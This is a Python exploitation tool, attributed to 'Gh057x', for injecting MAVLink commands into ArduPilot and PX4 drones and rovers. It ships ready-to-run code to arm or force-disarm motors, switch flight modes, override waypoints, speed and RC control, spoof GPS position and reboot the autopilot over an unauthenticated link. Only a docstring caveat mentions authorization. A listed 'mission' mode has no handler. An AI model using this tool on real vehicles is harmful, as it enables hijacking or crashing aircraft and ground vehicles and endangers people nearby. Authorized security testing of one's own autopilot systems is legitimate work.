#!/usr/bin/env python3
"""
mavlink_injection.py - Phase 7: MAVLink Command Injection

Active exploitation of MAVLink endpoints: waypoint override, flight mode
switching, arm/disarm, RC override, GPS spoofing, and emergency commands.

MAVLink is unauthenticated by default. Even v2 signing is rarely enabled.
Any host on the network segment can inject commands that the autopilot
will execute as if they came from the legitimate GCS.

CAUTION: These attacks can cause physical movement of vehicles.
Only use on systems you own or have explicit authorization to test.
Ensure safety controls (kill switch, geofence) are in place.

Attack modes:
  - mode_switch  : Change flight/drive mode (GUIDED, MANUAL, RTL, HOLD)
  - arm          : Arm the vehicle motors
  - disarm       : Disarm the vehicle motors
  - waypoint     : Inject a single waypoint in GUIDED mode
  - mission      : Upload a full replacement mission
  - rc_override  : Override RC channels (take over manual control)
  - speed        : Override speed setpoint
  - estop        : Emergency stop / kill switch
  - gps_spoof    : Inject fake GPS position (GLOBAL_POSITION_INT)
  - reboot       : Reboot the autopilot

Author  : Gh057x
Phase   : 7 — MAVLink / Autopilot Security
Requires: pymavlink
"""

import time
import json
import sys
import argparse
from dataclasses import dataclass, field
from typing import List, Dict, Optional
from datetime import datetime
from enum import Enum


# ============================================================================
# Attack Modes
# ============================================================================

class InjectionMode(Enum):
    MODE_SWITCH = "mode_switch"
    ARM = "arm"
    DISARM = "disarm"
    WAYPOINT = "waypoint"
    MISSION = "mission"
    RC_OVERRIDE = "rc_override"
    SPEED = "speed"
    ESTOP = "estop"
    GPS_SPOOF = "gps_spoof"
    REBOOT = "reboot"


# ArduPilot Rover custom modes
ARDUPILOT_ROVER_MODES = {
    "manual": 0,
    "acro": 1,
    "steering": 3,
    "hold": 4,
    "loiter": 5,
    "follow": 6,
    "simple": 7,
    "dock": 8,
    "auto": 10,
    "rtl": 11,
    "smartrtl": 12,
    "guided": 15,
    "initializing": 16,
}

# ArduPilot Copter custom modes
ARDUPILOT_COPTER_MODES = {
    "stabilize": 0,
    "acro": 1,
    "alt_hold": 2,
    "auto": 3,
    "guided": 4,
    "loiter": 5,
    "rtl": 6,
    "circle": 7,
    "land": 9,
    "drift": 11,
    "sport": 13,
    "flip": 14,
    "autotune": 15,
    "poshold": 16,
    "brake": 17,
    "throw": 18,
    "avoid_adsb": 19,
    "guided_nogps": 20,
    "smart_rtl": 21,
    "flowhold": 22,
    "follow": 23,
    "zigzag": 24,
    "systemid": 25,
    "autorotate": 26,
}

# PX4 main modes
PX4_MODES = {
    "manual": 1,
    "altitude": 2,
    "position": 3,
    "auto_mission": 4,
    "auto_loiter": 5,
    "auto_rtl": 6,
    "acro": 7,
    "offboard": 8,
    "stabilized": 9,
    "rattitude": 10,
    "auto_takeoff": 11,
    "auto_land": 12,
    "auto_follow": 13,
}


# ============================================================================
# Data Structures
# ============================================================================

@dataclass
class InjectionAction:
    """Record of a single injection action"""
    mode: str
    timestamp: float = field(default_factory=time.time)
    success: bool = False
    ack_result: int = -1
    ack_text: str = ""
    details: Dict = field(default_factory=dict)

    def to_dict(self):
        return {
            "mode": self.mode,
            "timestamp": datetime.fromtimestamp(self.timestamp).isoformat(),
            "success": self.success,
            "ack_result": self.ack_result,
            "ack_text": self.ack_text,
            "details": self.details,
        }


@dataclass
class InjectionResult:
    """Full injection session result"""
    target: str = ""
    port: int = 14550
    system_id: int = 0
    actions: List[InjectionAction] = field(default_factory=list)
    duration_sec: float = 0
    errors: List[str] = field(default_factory=list)

    def to_dict(self):
        return {
            "module": "mavlink_injection",
            "timestamp": datetime.now().isoformat(),
            "target": self.target,
            "port": self.port,
            "system_id": self.system_id,
            "actions": [a.to_dict() for a in self.actions],
            "success_count": len([a for a in self.actions if a.success]),
            "total_actions": len(self.actions),
            "duration_sec": round(self.duration_sec, 2),
            "errors": self.errors,
        }


# ============================================================================
# Injector
# ============================================================================

class MAVLinkInjector:
    """MAVLink command injection engine"""

    def __init__(self, verbose: bool = False, timeout: float = 5.0):
        self.verbose = verbose
        self.timeout = timeout
        self.conn = None
        self.result = InjectionResult()

    def connect(self, target: str, port: int = 14550,
                protocol: str = "udp") -> bool:
        """Establish MAVLink connection"""
        try:
            from pymavlink import mavutil
        except ImportError:
            print("[!] pymavlink required: pip install pymavlink")
            return False

        if protocol == "tcp":
            conn_str = f"tcp:{target}:{port}"
        else:
            conn_str = f"udpout:{target}:{port}"

        try:
            self.conn = mavutil.mavlink_connection(
                conn_str,
                source_system=255,
                source_component=0,
            )
            if self.verbose:
                print(f"[*] Connecting to {conn_str}...")

            self.conn.wait_heartbeat(timeout=self.timeout)
            self.result.target = target
            self.result.port = port
            self.result.system_id = self.conn.target_system

            if self.verbose:
                print(f"[+] Connected: sys={self.conn.target_system} "
                      f"comp={self.conn.target_component}")
            return True

        except Exception as e:
            if self.verbose:
                print(f"[-] Connection failed: {e}")
            self.result.errors.append(f"Connection: {e}")
            return False

    def _wait_ack(self, command_id: int = None) -> Optional[InjectionAction]:
        """Wait for COMMAND_ACK response"""
        try:
            ack = self.conn.recv_match(type="COMMAND_ACK",
                                        blocking=True, timeout=self.timeout)
            if ack:
                success = ack.result == 0  # MAV_RESULT_ACCEPTED
                ack_texts = {
                    0: "ACCEPTED",
                    1: "TEMPORARILY_REJECTED",
                    2: "DENIED",
                    3: "UNSUPPORTED",
                    4: "FAILED",
                    5: "IN_PROGRESS",
                    6: "CANCELLED",
                }
                return InjectionAction(
                    mode="ack",
                    success=success,
                    ack_result=ack.result,
                    ack_text=ack_texts.get(ack.result, f"UNKNOWN({ack.result})"),
                )
        except Exception:
            pass
        return None

    def inject_mode_switch(self, mode_name: str,
                           vehicle_type: str = "rover") -> InjectionAction:
        """Switch the vehicle's flight/drive mode"""
        from pymavlink import mavutil

        mode_maps = {
            "rover": ARDUPILOT_ROVER_MODES,
            "copter": ARDUPILOT_COPTER_MODES,
            "px4": PX4_MODES,
        }
        mode_map = mode_maps.get(vehicle_type, ARDUPILOT_ROVER_MODES)
        custom_mode = mode_map.get(mode_name.lower())

        if custom_mode is None:
            action = InjectionAction(
                mode="mode_switch",
                success=False,
                details={"error": f"Unknown mode '{mode_name}' for {vehicle_type}",
                         "available": list(mode_map.keys())},
            )
            self.result.actions.append(action)
            return action

        if self.verbose:
            print(f"[*] Switching to mode: {mode_name} (custom_mode={custom_mode})")

        base_mode = mavutil.mavlink.MAV_MODE_FLAG_CUSTOM_MODE_ENABLED
        self.conn.mav.set_mode_send(
            self.conn.target_system,
            base_mode,
            custom_mode,
        )

        ack = self._wait_ack()
        action = InjectionAction(
            mode="mode_switch",
            success=ack.success if ack else False,
            ack_result=ack.ack_result if ack else -1,
            ack_text=ack.ack_text if ack else "NO_ACK",
            details={"target_mode": mode_name, "custom_mode": custom_mode,
                     "vehicle_type": vehicle_type},
        )
        self.result.actions.append(action)

        if self.verbose:
            status = "\033[92mOK\033[0m" if action.success else "\033[91mFAILED\033[0m"
            print(f"  [{status}] Mode switch → {mode_name}: {action.ack_text}")

        return action

    def inject_arm(self, force: bool = False) -> InjectionAction:
        """Arm the vehicle"""
        from pymavlink import mavutil

        if self.verbose:
            print(f"[*] Arming vehicle (force={force})...")

        self.conn.mav.command_long_send(
            self.conn.target_system,
            self.conn.target_component,
            mavutil.mavlink.MAV_CMD_COMPONENT_ARM_DISARM,
            0,
            1,                      # arm
            21196 if force else 0,  # force arm magic number
            0, 0, 0, 0, 0,
        )

        ack = self._wait_ack()
        action = InjectionAction(
            mode="arm",
            success=ack.success if ack else False,
            ack_result=ack.ack_result if ack else -1,
            ack_text=ack.ack_text if ack else "NO_ACK",
            details={"force": force},
        )
        self.result.actions.append(action)
        return action

    def inject_disarm(self, force: bool = False) -> InjectionAction:
        """Disarm the vehicle"""
        from pymavlink import mavutil

        if self.verbose:
            print(f"[*] Disarming vehicle (force={force})...")

        self.conn.mav.command_long_send(
            self.conn.target_system,
            self.conn.target_component,
            mavutil.mavlink.MAV_CMD_COMPONENT_ARM_DISARM,
            0,
            0,                      # disarm
            21196 if force else 0,  # force disarm magic number
            0, 0, 0, 0, 0,
        )

        ack = self._wait_ack()
        action = InjectionAction(
            mode="disarm",
            success=ack.success if ack else False,
            ack_result=ack.ack_result if ack else -1,
            ack_text=ack.ack_text if ack else "NO_ACK",
            details={"force": force},
        )
        self.result.actions.append(action)
        return action

    def inject_waypoint(self, lat: float, lon: float, alt: float = 10.0) -> InjectionAction:
        """Send a GUIDED mode waypoint (SET_POSITION_TARGET_GLOBAL_INT)"""
        from pymavlink import mavutil

        if self.verbose:
            print(f"[*] Injecting waypoint: lat={lat} lon={lon} alt={alt}")

        self.conn.mav.set_position_target_global_int_send(
            0,                                  # time_boot_ms
            self.conn.target_system,
            self.conn.target_component,
            mavutil.mavlink.MAV_FRAME_GLOBAL_RELATIVE_ALT_INT,
            0b0000111111111000,                 # type_mask: position only
            int(lat * 1e7),
            int(lon * 1e7),
            alt,
            0, 0, 0,                           # vx, vy, vz
            0, 0, 0,                           # afx, afy, afz
            0, 0,                              # yaw, yaw_rate
        )

        action = InjectionAction(
            mode="waypoint",
            success=True,
            details={"lat": lat, "lon": lon, "alt": alt},
        )
        self.result.actions.append(action)
        return action

    def inject_rc_override(self, channels: Dict[int, int],
                           duration: float = 5.0) -> InjectionAction:
        """
        Override RC channels.
        channels: dict of {channel_num (1-8): pwm_value (1000-2000)}
        1500 = center, 1000 = min, 2000 = max
        """
        if self.verbose:
            print(f"[*] RC override: {channels} for {duration}s")

        ch = [0] * 8
        for ch_num, pwm in channels.items():
            if 1 <= ch_num <= 8:
                ch[ch_num - 1] = max(1000, min(2000, pwm))

        start = time.time()
        count = 0

        while time.time() - start < duration:
            self.conn.mav.rc_channels_override_send(
                self.conn.target_system,
                self.conn.target_component,
                ch[0], ch[1], ch[2], ch[3],
                ch[4], ch[5], ch[6], ch[7],
            )
            count += 1
            time.sleep(0.05)  # 20 Hz

        # Release override
        self.conn.mav.rc_channels_override_send(
            self.conn.target_system,
            self.conn.target_component,
            0, 0, 0, 0, 0, 0, 0, 0,
        )

        action = InjectionAction(
            mode="rc_override",
            success=True,
            details={"channels": channels, "duration": duration,
                     "packets_sent": count},
        )
        self.result.actions.append(action)
        return action

    def inject_speed(self, speed_mps: float, throttle: float = -1,
                     is_ground_speed: bool = True) -> InjectionAction:
        """Override vehicle speed"""
        from pymavlink import mavutil

        if self.verbose:
            print(f"[*] Setting speed: {speed_mps} m/s")

        speed_type = 1 if is_ground_speed else 0

        self.conn.mav.command_long_send(
            self.conn.target_system,
            self.conn.target_component,
            mavutil.mavlink.MAV_CMD_DO_CHANGE_SPEED,
            0,
            speed_type,     # speed type (0=airspeed, 1=groundspeed)
            speed_mps,      # speed m/s
            throttle,       # throttle (-1 = no change)
            0, 0, 0, 0,
        )

        ack = self._wait_ack()
        action = InjectionAction(
            mode="speed",
            success=ack.success if ack else False,
            ack_result=ack.ack_result if ack else -1,
            ack_text=ack.ack_text if ack else "NO_ACK",
            details={"speed_mps": speed_mps, "throttle": throttle},
        )
        self.result.actions.append(action)
        return action

    def inject_estop(self) -> InjectionAction:
        """Emergency stop — immediately kill motors"""
        from pymavlink import mavutil

        if self.verbose:
            print(f"\033[91m[!] EMERGENCY STOP\033[0m")

        self.conn.mav.command_long_send(
            self.conn.target_system,
            self.conn.target_component,
            mavutil.mavlink.MAV_CMD_COMPONENT_ARM_DISARM,
            0,
            0,      # disarm
            21196,  # force
            0, 0, 0, 0, 0,
        )

        ack = self._wait_ack()
        action = InjectionAction(
            mode="estop",
            success=ack.success if ack else False,
            ack_result=ack.ack_result if ack else -1,
            ack_text=ack.ack_text if ack else "NO_ACK",
        )
        self.result.actions.append(action)
        return action

    def inject_gps_spoof(self, lat: float, lon: float, alt: float = 100.0,
                         duration: float = 10.0) -> InjectionAction:
        """
        Inject fake GPS position data (GPS_INPUT msg 232).
        This feeds false position to the autopilot's EKF.
        """
        if self.verbose:
            print(f"[*] GPS spoof: lat={lat} lon={lon} alt={alt} for {duration}s")

        import struct
        start = time.time()
        count = 0

        while time.time() - start < duration:
            time_usec = int(time.time() * 1e6)
            self.conn.mav.gps_input_send(
                time_usec,
                0,                  # gps_id
                0b1111111111111,    # ignore_flags: use all fields
                int(time.time() * 1000) % (2**32),  # time_week_ms
                0,                  # time_week
                3,                  # fix_type: 3D Fix
                int(lat * 1e7),
                int(lon * 1e7),
                alt,
                1.0,                # hdop
                1.0,                # vdop
                0.0,                # vn
                0.0,                # ve
                0.0,                # vd
                0.01,               # speed_accuracy
                0.01,               # horiz_accuracy
                0.01,               # vert_accuracy
                12,                 # satellites_visible
                0,                  # yaw (0 = not available)
            )
            count += 1
            time.sleep(0.1)  # 10 Hz

        action = InjectionAction(
            mode="gps_spoof",
            success=True,
            details={"lat": lat, "lon": lon, "alt": alt,
                     "duration": duration, "packets_sent": count},
        )
        self.result.actions.append(action)
        return action

    def inject_reboot(self) -> InjectionAction:
        """Reboot the autopilot"""
        from pymavlink import mavutil

        if self.verbose:
            print("[*] Rebooting autopilot...")

        self.conn.mav.command_long_send(
            self.conn.target_system,
            self.conn.target_component,
            mavutil.mavlink.MAV_CMD_PREFLIGHT_REBOOT_SHUTDOWN,
            0,
            1,  # autopilot reboot
            0,  # onboard computer: no action
            0, 0, 0, 0, 0,
        )

        ack = self._wait_ack()
        action = InjectionAction(
            mode="reboot",
            success=ack.success if ack else False,
            ack_result=ack.ack_result if ack else -1,
            ack_text=ack.ack_text if ack else "NO_ACK",
        )
        self.result.actions.append(action)
        return action

    def close(self):
        """Close connection"""
        if self.conn:
            self.conn.close()


# ============================================================================
# Reporting
# ============================================================================

def print_injection_report(result: InjectionResult):
    """Pretty-print injection results"""
    print(f"\n{'=' * 60}")
    print(f"  MAVLink INJECTION — {result.target}:{result.port}")
    print(f"  System: {result.system_id} | Duration: {result.duration_sec:.1f}s")
    print(f"{'=' * 60}")

    if not result.actions:
        print("\n  [-] No actions performed")
        return

    ok = len([a for a in result.actions if a.success])
    fail = len(result.actions) - ok
    print(f"\n  Actions: {len(result.actions)} total | "
          f"\033[92m{ok} OK\033[0m | \033[91m{fail} FAILED\033[0m\n")

    for i, a in enumerate(result.actions, 1):
        status = "\033[92mOK\033[0m" if a.success else "\033[91mFAIL\033[0m"
        print(f"  [{i}] {a.mode:15s} [{status}] {a.ack_text}")
        if a.details:
            for k, v in a.details.items():
                print(f"       {k}: {v}")
        print()

    if result.errors:
        for e in result.errors:
            print(f"  [!] {e}")

    print(f"{'=' * 60}\n")


def export_json(result: InjectionResult, output_file: str):
    """Export results to JSON"""
    with open(output_file, "w") as f:
        json.dump(result.to_dict(), f, indent=2, default=str)
    print(f"[+] Injection results exported to {output_file}")


# ============================================================================
# CLI
# ============================================================================

def main():
    parser = argparse.ArgumentParser(
        description="Phase 7: MAVLink command injection"
    )
    parser.add_argument("-t", "--target", required=True)
    parser.add_argument("-p", "--port", type=int, default=14550)
    parser.add_argument("--protocol", choices=["udp", "tcp"], default="udp")
    parser.add_argument("--mode", required=True,
                        choices=[m.value for m in InjectionMode])
    parser.add_argument("--flight-mode", default="guided",
                        help="Target flight mode for mode_switch")
    parser.add_argument("--vehicle-type", default="rover",
                        choices=["rover", "copter", "px4"])
    parser.add_argument("--lat", type=float, default=0.0)
    parser.add_argument("--lon", type=float, default=0.0)
    parser.add_argument("--alt", type=float, default=10.0)
    parser.add_argument("--speed", type=float, default=5.0)
    parser.add_argument("--duration", type=float, default=5.0)
    parser.add_argument("--force", action="store_true")
    parser.add_argument("--timeout", type=float, default=5.0)
    parser.add_argument("-o", "--output", help="Output JSON file")
    parser.add_argument("-v", "--verbose", action="store_true")

    args = parser.parse_args()

    injector = MAVLinkInjector(verbose=args.verbose, timeout=args.timeout)

    if not injector.connect(args.target, args.port, args.protocol):
        sys.exit(1)

    start = time.time()

    mode = InjectionMode(args.mode)
    if mode == InjectionMode.MODE_SWITCH:
        injector.inject_mode_switch(args.flight_mode, args.vehicle_type)
    elif mode == InjectionMode.ARM:
        injector.inject_arm(force=args.force)
    elif mode == InjectionMode.DISARM:
        injector.inject_disarm(force=args.force)
    elif mode == InjectionMode.WAYPOINT:
        injector.inject_waypoint(args.lat, args.lon, args.alt)
    elif mode == InjectionMode.RC_OVERRIDE:
        injector.inject_rc_override({3: 1700}, duration=args.duration)
    elif mode == InjectionMode.SPEED:
        injector.inject_speed(args.speed)
    elif mode == InjectionMode.ESTOP:
        injector.inject_estop()
    elif mode == InjectionMode.GPS_SPOOF:
        injector.inject_gps_spoof(args.lat, args.lon, args.alt, args.duration)
    elif mode == InjectionMode.REBOOT:
        injector.inject_reboot()

    injector.result.duration_sec = time.time() - start
    injector.close()

    print_injection_report(injector.result)

    if args.output:
        export_json(injector.result, args.output)


if __name__ == "__main__":
    main()
